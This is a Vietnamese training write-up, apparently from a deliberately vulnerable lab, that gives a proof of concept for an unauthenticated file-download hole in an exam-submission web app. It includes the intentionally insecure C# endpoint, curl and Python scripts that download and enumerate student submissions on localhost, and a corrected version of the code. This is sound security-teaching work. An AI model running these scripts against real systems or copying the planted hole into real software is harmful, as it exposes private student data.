# Proof of Concept (PoC) - Lỗ hổng Missing Authentication

## Mô tả lỗ hổng

**Loại lỗ hổng**: Missing Authentication / Broken Access Control  
**Endpoint bị lỗi**: `GET /SecureFile/Submission/{fileName}`  
**Mức độ**: High  
**Mô tả**: Endpoint `/SecureFile/Submission/{fileName}` cho phép unauthenticated users (người dùng chưa đăng nhập) truy cập và download file submission của học sinh. Endpoint này thiếu kiểm tra authentication và authorization, cho phép bất kỳ ai cũng có thể download file submission chỉ bằng cách biết tên file.

## Nguyên nhân

Endpoint `/SecureFile/Submission/{fileName}` có các lỗ hổng sau:

1. **Thiếu authentication check**: Method có attribute `[AllowAnonymous]`, cho phép unauthenticated users truy cập
2. **Thiếu authorization check**: Không kiểm tra quyền truy cập (ownership, role, subject assignment)
3. **Không validate submission ownership**: Không kiểm tra user có phải là owner của submission không
4. **Không validate teacher role**: Không kiểm tra teacher có dạy môn học của submission không

**Code có lỗ hổng:**

```csharp
[HttpGet("Submission/{fileName}")]
[AllowAnonymous] // VULNERABILITY: Missing Authentication
public async Task<IActionResult> GetSubmission(string fileName)
{
    // VULNERABILITY: No authorization checks
    // Removed all security checks:
    // - No authentication required
    // - No ownership check
    // - No role check
    // - No subject assignment check
    
    return ServeFile("Submissions", fileName);
}
```

## Các bước thực hiện PoC

### Bước 1: Chuẩn bị môi trường

1. Đảm bảo ứng dụng đang chạy trên `http://localhost:5000`
2. Có ít nhất một submission file trong hệ thống
3. Biết tên file submission (có thể từ URL khi Teacher/Student xem, hoặc enumeration)

### Bước 2: Xác định tên file submission

**Cách 1: Từ giao diện Teacher/Student (nếu có quyền)**
- Đăng nhập với tài khoản Teacher hoặc Student
- Xem danh sách submission
- Lấy tên file từ URL hoặc link download

**Cách 2: Enumeration (thử các tên file)**
- Format tên file thường là: `exam_{examId}_student_{studentId}_{guid}.pdf`
- Thử các ID hợp lệ: `exam_1_student_1_*.pdf`
- Hoặc thử các pattern khác

**Cách 3: Từ database**
- Query database để lấy tên file:
  ```sql
  SELECT FilePath FROM Submissions
  ```

### Bước 3: Khai thác lỗ hổng (không cần đăng nhập)

**Scenario 1: Truy cập trực tiếp URL**

1. **Không đăng nhập** (hoặc đăng xuất nếu đã đăng nhập)
2. **Xác định tên file submission** (ví dụ: `exam_1_student_1_abc123.pdf`)
3. **Truy cập trực tiếp URL**:
   ```
   http://localhost:5000/SecureFile/Submission/exam_1_student_1_abc123.pdf
   ```
4. ✅ **Kết quả**: File được download thành công mà không cần authentication

**Scenario 2: Sử dụng cURL (không có cookie/session)**

```bash
# Không cần đăng nhập, không cần cookie
curl -O "http://localhost:5000/SecureFile/Submission/exam_1_student_1_abc123.pdf"
```

**Scenario 3: Sử dụng Python script**

```python
import requests

# Không cần đăng nhập
BASE_URL = "http://localhost:5000"
FILE_NAME = "exam_1_student_1_abc123.pdf"  # Thay bằng tên file thực tế

# Download file mà không cần authentication
response = requests.get(f"{BASE_URL}/SecureFile/Submission/{FILE_NAME}", allow_redirects=False)

if response.status_code == 200:
    print(f"[+] File downloaded successfully!")
    print(f"[+] Content-Type: {response.headers.get('Content-Type')}")
    print(f"[+] File size: {len(response.content)} bytes")
    
    # Lưu file
    with open(FILE_NAME, "wb") as f:
        f.write(response.content)
    print(f"[+] File saved as: {FILE_NAME}")
else:
    print(f"[X] Failed: Status {response.status_code}")
    print(f"Response: {response.text[:200]}")
```

**Scenario 4: Enumeration để tìm file**

```python
import requests

BASE_URL = "http://localhost:5000"

# Thử các pattern tên file
for exam_id in range(1, 10):
    for student_id in range(1, 10):
        # Pattern: exam_{examId}_student_{studentId}_{guid}.pdf
        # Thử với guid ngắn hoặc pattern khác
        patterns = [
            f"exam_{exam_id}_student_{student_id}_test.pdf",
            f"exam_{exam_id}_student_{student_id}_123.pdf",
        ]
        
        for pattern in patterns:
            response = requests.get(
                f"{BASE_URL}/SecureFile/Submission/{pattern}",
                allow_redirects=False
            )
            
            if response.status_code == 200:
                print(f"[+] FOUND: {pattern}")
                print(f"    Size: {len(response.content)} bytes")
            elif response.status_code == 404:
                print(f"[-] Not found: {pattern}")
            else:
                print(f"[?] Status {response.status_code}: {pattern}")
```

### Bước 4: Xác minh lỗ hổng

1. **Xác nhận không cần đăng nhập:**
   - Mở browser ở chế độ Incognito/Private
   - Truy cập URL submission file
   - ✅ File được download thành công

2. **Xác nhận không cần quyền:**
   - Đăng nhập với tài khoản không liên quan (ví dụ: Student khác)
   - Truy cập submission file của Student khác
   - ✅ File vẫn được download thành công

3. **Xác nhận có thể truy cập tất cả file:**
   - Thử truy cập các file submission khác nhau
   - ✅ Tất cả đều có thể truy cập

## Kết quả mong đợi

- ✅ Unauthenticated users có thể truy cập submission files
- ✅ Response 200 OK thay vì 401 Unauthorized hoặc 403 Forbidden
- ✅ File được download thành công
- ✅ Không cần cookie/session/token
- ✅ Có thể enumeration để tìm tất cả submission files

## Tác động

1. **Lộ thông tin nhạy cảm**: Unauthenticated users có thể xem bài làm của học sinh
2. **Vi phạm tính riêng tư**: Thông tin cá nhân và bài làm bị lộ
3. **Gian lận**: Có thể xem bài làm của người khác để sao chép
4. **Thiếu công bằng**: Học sinh có thể xem bài làm của nhau
5. **Vi phạm chính sách**: Hệ thống không đảm bảo tính bảo mật và phân quyền

## Cách khắc phục

1. **Yêu cầu authentication**: Xóa `[AllowAnonymous]` và đảm bảo `[Authorize]` được áp dụng
2. **Kiểm tra authorization**: Kiểm tra quyền truy cập trước khi serve file
3. **Kiểm tra ownership**: Đảm bảo chỉ owner (student) mới có thể xem file của mình
4. **Kiểm tra role**: Teacher chỉ có thể xem file của học sinh trong môn học họ dạy
5. **Kiểm tra subject assignment**: Đảm bảo teacher được assign vào môn học

**Code sửa lỗi:**

```csharp
[HttpGet("Submission/{fileName}")]
// Remove [AllowAnonymous] - require authentication
public async Task<IActionResult> GetSubmission(string fileName)
{
    // Security: Sanitize fileName first
    if (string.IsNullOrWhiteSpace(fileName))
        return BadRequest("Invalid file name.");
    
    fileName = Path.GetFileName(fileName);
    
    // Security: Find submission record
    var submission = await _context.Submissions
        .Include(s => s.Exam)
        .FirstOrDefaultAsync(s => s.FilePath.EndsWith(fileName));

    if (submission == null) return NotFound("Submission record not found.");

    // Security: Check authentication and authorization
    var currentUserId = GetUserId();
    var isAdmin = User.IsInRole("Admin");
    var isTeacher = User.IsInRole("Teacher");
    var isOwner = submission.StudentId == currentUserId;

    bool hasAccess = isOwner || isAdmin;

    if (!hasAccess && isTeacher)
    {
        // Security: Teacher can only view submissions for their subjects
        var examSubjectId = submission.Exam.SubjectId;
        var teacherTeachesSubject = await _context.UserSubjects
            .AnyAsync(us => us.UserId == currentUserId && us.SubjectId == examSubjectId);

        if (teacherTeachesSubject)
        {
            hasAccess = true;
        }
    }

    if (!hasAccess)
    {
        return Forbid();
    }

    return ServeFile("Submissions", fileName);
}
```

## Chi tiết kỹ thuật

### Vấn đề trong code:

**File:** `Controllers/View/SecureFileController.cs`

**Method GetSubmission (có lỗ hổng):**

```csharp
[HttpGet("Submission/{fileName}")]
[AllowAnonymous] // VULNERABILITY: Missing Authentication
public async Task<IActionResult> GetSubmission(string fileName)
{
    // VULNERABILITY: No authorization checks
    // Removed all security checks
    
    return ServeFile("Submissions", fileName);
}
```

**So sánh với code an toàn (đã bị xóa):**

```csharp
// Security checks đã bị xóa:
// - [Authorize] attribute (class level)
// - Authentication check
// - Ownership check (isOwner)
// - Role check (isAdmin, isTeacher)
// - Subject assignment check (teacherTeachesSubject)
```

### Flow của lỗ hổng:

1. **Unauthenticated user** truy cập URL `/SecureFile/Submission/{fileName}`
2. **Server không kiểm tra authentication** (do `[AllowAnonymous]`)
3. **Server không kiểm tra authorization** (đã bị xóa)
4. **File được serve trực tiếp** → Unauthenticated user có thể download

### Cách khai thác:

1. **Direct Access**: Nếu biết tên file, truy cập trực tiếp URL
2. **Enumeration**: Thử các pattern tên file để tìm file
3. **Information Disclosure**: Từ các nguồn khác (logs, errors, etc.) để lấy tên file

## Lưu ý

- Lỗ hổng này được tạo ra **có chủ đích** cho mục đích training/giáo dục về bảo mật
- Trong môi trường production, **LUÔN yêu cầu authentication** cho các endpoint nhạy cảm
- **Missing Authentication** là một trong những lỗ hổng phổ biến nhất (OWASP Top 10)
- **Không bao giờ** sử dụng `[AllowAnonymous]` cho các endpoint chứa dữ liệu nhạy cảm
- **Luôn kiểm tra authorization** ngay cả khi đã có authentication
- **Defense in Depth**: Áp dụng nhiều lớp bảo vệ (authentication, authorization, encryption)

## Checklist test

- [ ] Không đăng nhập, truy cập URL submission file
- [ ] Xác nhận file được download thành công (200 OK)
- [ ] Đăng nhập với tài khoản không liên quan, truy cập file của người khác
- [ ] Xác nhận vẫn có thể truy cập (thiếu authorization check)
- [ ] Enumeration: Thử các pattern tên file để tìm file
- [ ] Verify có thể truy cập tất cả submission files
- [ ] Test với cURL/Python script không có cookie/session
- [ ] Verify response không yêu cầu authentication (không có 401/403)

